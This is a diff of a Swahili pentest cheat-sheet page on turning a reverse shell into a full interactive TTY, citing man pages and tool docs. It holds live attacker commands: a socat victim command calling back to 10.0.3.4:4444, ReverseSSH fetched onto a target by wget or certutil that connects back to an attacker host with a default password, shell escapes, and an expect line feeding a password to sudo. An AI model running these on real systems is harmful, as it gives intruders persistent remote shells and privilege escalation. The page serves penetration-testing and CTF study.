@@ -1,26 +1,31 @@
-# TTY Kamili
+# Full TTYs
 
-{{#include ../../banners/hacktricks-training.md}}
+## Full TTY
 
-## TTY Kamili
-
-Kumbuka kwamba shell unayoweka katika variable ya `SHELL` **lazima** iwe **imeorodheshwa ndani ya** _**/etc/shells**_ au `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Pia, kumbuka kwamba snippets zifuatazo hufanya kazi kwenye bash pekee. Ikiwa uko kwenye zsh, badilisha kwenda bash kabla ya kupata shell kwa kuendesha `bash`.
+`/etc/shells` huorodhesha majina ya njia za `login-shell` halali na hutumiwa na baadhi ya programu; si sharti la lazima kwa kila hali ili kutenga PTY.<sup>[[3]](#references)[[4]](#references)</sup> Ikiwa programu kama `pkexec` itakataa `SHELL` kwa ujumbe `The value for the SHELL variable was not found in the /etc/shells file`, hakikisha njia kamili ya shell (kwa mfano, `/bin/bash`) ipo katika `/etc/shells`.<sup>[[10]](#references)</sup> Mfuatano wa kurejesha `CTRL+Z`/`fg` hapa chini hutumia udhibiti wa kazi wa Bash; ikiwa shell ya sasa si Bash, anzisha Bash kabla ya kutumia mfuatano huo.<sup>[[7]](#references)</sup>
 
 #### Python
+
+`pty.spawn` ya Python huanzisha programu ikiwa imeunganishwa na mitiririko ya kawaida ya ingizo, towe na hitilafu ya mchakato wa sasa, hivyo kuipa Bash pseudo-terminal katika session hii.<sup>[[4]](#references)</sup>
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 > [!TIP]
-> Unaweza kupata **idadi** ya **safu** na **nguzo** kwa kutekeleza **`stty -a`**
+> Unaweza kupata **idadi** ya **safu mlalo** na **safu wima** kwa kuendesha **`stty -a`**; `-a` huchapisha mipangilio yote ya sasa ya terminal. Matokeo ya amri hii hutegemea terminal, kwa hivyo tumia thamani zilizoripotiwa na kipindi cha sasa.<sup>[[11]](#references)</sup>
 
 #### script
+
+Zana ya `script` hurekodi kipindi cha terminal; hapa `/dev/null` hutupa typescript, `-q` hukandamiza jumbe za kuanza na kukamilika, na `-c` huendesha Bash badala ya shell chaguo-msingi.<sup>[[5]](#references)</sup>
 ```bash
 script /dev/null -qc /bin/bash #/dev/null is to not store anything
+```
+Baada ya mojawapo ya njia za PTY-spawn, simamisha session ya Netcat na uirejeshe kwa local raw mode, kisha weka mazingira na vipimo vya remote terminal:
+```bash
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 #### socat
+
+listener hutumia terminal ya sasa katika raw mode huku local echo ikiwa imezimwa na hukubali TCP connections kwenye port 4444. Victim command hutenga pty, huunganisha stderr, huunda session, husambaza SIGINT, na hutumia mipangilio salama ya terminal; ongeza `ctty` ikiwa child inahitaji controlling terminal.<sup>[[6]](#references)</sup>
 ```bash
 #Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
@@ -41,36 +46,37 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 - IRB: `exec "/bin/sh"`
 - vi: `:!bash`
 - vi: `:set shell=/bin/bash:shell`
-- nmap: `!sh`
+- nmap (old versions with `--interactive`): `!sh`
+
+Nmap escape hii hutegemea version: Nmap iliondoa mode yake ya `--interactive` katika matoleo ya baadaye, hivyo `!sh` inatumika tu katika matoleo ya zamani.<sup>[[13]](#references)</sup>
 
 ## ReverseSSH
 
 Njia rahisi ya kupata **interactive shell access**, pamoja na **file transfers** na **port forwarding**, ni kuweka ssh server iliyounganishwa statically [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye target.<sup>[[1]](#references)</sup>
 
-Hapa chini kuna mfano wa `x86` wenye binaries zilizobanwa kwa upx. Kwa binaries nyingine, angalia [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Hapa chini kuna mfano wa `x86` unaotumia binary iliyochapishwa na project na kubanwa kwa UPX. Kwa architectures nyingine au release artifacts, tumia [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) kama mwongozo wa kuvinavigeti.<sup>[[1]](#references)</sup>
 
-1. Jiandae locally ili kupokea ombi la ssh port forwarding:
+1. Andaa host ya ndani ili ipokee SSH connection inayoingia. Katika listener mode, `-l` huwezesha listener na `-p 4444` huchagua port ambayo inapokea connection kutoka kwa target.<sup>[[1]](#references)</sup>
 ```bash
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
 
 /dev/shm/reverse-ssh -v -l -p 4444
 ```
-- (2a) Linux inayolengwa:
+- (2a) Linux target. Hamisha artifact ile ile ya `upx_reverse-sshx86` hadi `/dev/shm/reverse-ssh` na uifanye iwe executable. `-p 4444` ya target huchagua port ya listener iliyo hapo juu, na `kali@10.0.0.2` hutoa account na host inayotumiwa kuunganisha kurudi.<sup>[[1]](#references)</sup>
 ```bash
-# Drop it via your preferred way, e.g.
-wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
-
 /dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
 ```
-- (2b) Windows 10 target (kwa matoleo ya awali, angalia [project readme](https://github.com/Fahrj/reverse-ssh#features)):
+- (2b) Windows target. Full interactive PowerShell inahitaji Windows 10 build 17763; angalia [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
 ```bash
 # Drop it via your preferred way, e.g.
 certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe
 
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
-- Ikiwa ombi la port forwarding la ReverseSSH lilifanikiwa, sasa unapaswa kuweza kuingia ukitumia password chaguo-msingi `letmeinbrudipls` katika muktadha wa user anayeendesha `reverse-ssh(.exe)`:
+Mfano wa Windows hutumia `certutil` pamoja na `-f -urlcache`; Microsoft inaeleza `-f` kama kulazimisha fetch ya URL na inabainisha kuwa parameters zinazopatikana hutofautiana kulingana na version, kwa hivyo kagua `certutil -?` ikiwa mfumo huu haupatikani.<sup>[[12]](#references)</sup>
+
+- Baada ya reverse connection kufanikiwa, listener ya reverse-mode ya ReverseSSH hufunga port `8888` kwa default (au thamani iliyotolewa kwa `-b`), na connections zinazoingia hukubali username yoyote pamoja na password ya default `letmeinbrudipls`. Remote shell huendeshwa kwa privileges za account iliyoanzisha `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -80,19 +86,29 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-[Penelope](https://github.com/brightio/penelope) huboresha kiotomatiki Linux reverse shells kuwa TTY, hushughulikia ukubwa wa terminal, huhifadhi kila kitu kwenye log na mengine mengi. Pia hutoa readline support kwa Windows shells.<sup>[[2]](#references)</sup>
+[Penelope](https://github.com/brightio/penelope) huboresha kiotomatiki reverse shells za Unix-like kuwa PTY, hubadilisha ukubwa wa terminals za Unix-like, na kuhifadhi kumbukumbu za mwingiliano wa shell; kwa shells za Windows hutoa readline lakini si kubadilisha ukubwa wa terminal kwa wakati halisi.<sup>[[2]](#references)</sup>
 
-![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
+Endesha `penelope` ili kusikiliza kwenye `0.0.0.0:4444` kwa default; shells zinazoingia za Unix-like zinaweza kuboreshwa na kuhifadhiwa kumbukumbu kiotomatiki.<sup>[[2]](#references)</sup>
 
 ## Bila TTY
 
-Ikiwa kwa sababu fulani huwezi kupata full TTY, **bado unaweza kuingiliana na programu** zinazotarajia input ya mtumiaji. Katika mfano ufuatao, password inapitishwa kwa `sudo` ili kusoma file:
+Ikiwa kwa sababu fulani huwezi kupata TTY kamili, **bado unaweza kuingiliana na programu** zinazotarajia ingizo kutoka kwa mtumiaji. Katika mfano ufuatao, Expect huanzisha `sudo`, husubiri ombi lake la password, hutuma password, na kurudisha udhibiti kwa `interact`; `sudo -S` husoma password yake kutoka kwenye standard input. Itumie tu katika lab iliyoidhinishwa na epuka kuweka credentials halisi kwenye historia ya shell au faili za source.<sup>[[8]](#references)[[9]](#references)</sup>
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
-## Marejeo
+## References
 
-- [1] [ReverseSSH - Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh)
-- [2] [Penelope - Shell handler that automates a few things to make life easier](https://github.com/brightio/penelope)
-
+- [1] [ReverseSSH - ssh server iliyounganishwa tuli yenye utendaji wa reverse shell kwa CTFs na kadhalika](https://github.com/Fahrj/reverse-ssh)
+- [2] [Penelope - Shell handler inayotumia automation ya mambo machache ili kurahisisha maisha](https://github.com/brightio/penelope)
+- [3] [shells(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
+- [4] [Python `pty` — documentation ya Python](https://docs.python.org/3/library/pty.html)
+- [5] [script(1) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/script.1.html)
+- [6] [socat(1) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
+- [7] [Mwongozo wa Marejeleo wa Bash — Udhibiti wa Kazi](https://www.gnu.org/s/bash/manual/bash.html)
+- [8] [sudo(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
+- [9] [expect(1) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
+- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
+- [11] [stty(1) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
+- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
+- [13] [Kumbukumbu ya Mabadiliko ya Nmap](https://nmap.org/changelog.html)
 {{#include ../../banners/hacktricks-training.md}}
